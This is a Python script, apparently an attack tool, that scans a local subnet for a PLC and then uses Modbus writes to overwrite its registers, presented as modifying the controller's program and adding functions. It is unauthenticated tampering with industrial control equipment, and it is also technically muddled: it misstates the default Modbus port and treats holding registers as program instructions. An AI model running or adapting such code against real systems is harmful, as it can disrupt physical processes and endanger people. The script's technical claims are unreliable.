import socket
import struct
from pymodbus.client.sync import ModbusTcpClient

# Define the PLC's IP address and port
plc_ip = None
plc_port = 1700  # Default Modbus port

# Define the Modbus function codes
READ_COILS = 0x01
READ_INPUT_BITS = 0x02
READ_HOLDING_REGISTERS = 0x03
READ_INPUT_REGISTERS = 0x04
WRITE_SINGLE_COIL = 0x05
WRITE_SINGLE_REGISTER = 0x06

# Define the Modbus address of the program
program_address = 0x0000  # Replace with the actual address of the program

# Define the length of the program
program_length = 0x100  # Replace with the actual length of the program

def find_plc_ip():
    global plc_ip
    # Use the socket library to scan the network for the PLC's IP address
    for ip in range(1, 255):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect(("192.168.9." + str(ip), plc_port))
            sock.close()
            plc_ip = "192.168.9." + str(ip)
            break
        except socket.error:
            pass

def modify_program():
    global plc_ip
    # Use the pymodbus library to access the PLC's memory regions
    client = ModbusTcpClient(plc_ip, plc_port)
    # Read the program
    response = client.read_holding_registers(program_address, program_length)
    # Extract the program from the response
    program = response.registers
    # Modify the program
    program[0] = 0xFF00  # Modify the first instruction
    # Write the modified program back to the PLC
    client.write_registers(program_address, program)

def add_function():
    global plc_ip
    # Use the pymodbus library to access the PLC's memory regions
    client = ModbusTcpClient(plc_ip, plc_port)
    # Create a new function
    new_function = [0xFF00, 0x0000, 0x0000, 0x0000]
    # Write the new function to the PLC
    client.write_registers(program_address, new_function)

def modify_function():
    global plc_ip
    # Use the pymodbus library to access the PLC's memory regions
    client = ModbusTcpClient(plc_ip, plc_port)
    # Read the existing function
    response = client.read_holding_registers(program_address, program_length)
    # Extract the existing function from the response
    existing_function = response.registers
    # Modify the existing function
    existing_function[0] = 0xFF01  # Modify the first instruction
    # Write the modified existing function back to the PLC
    client.write_registers(program_address, existing_function)

def main():
    global plc_ip
    # Find the PLC's IP address
    find_plc_ip()
    if plc_ip is None:
        print("PLC not found on the network")
        return
    # Modify the program
    modify_program()
    print("Program modified")
    # Add a new function
    add_function()
    print("New function added")
    # Modify an existing function
    modify_function()
    print("Existing function modified")

if __name__ == "__main__":
    main()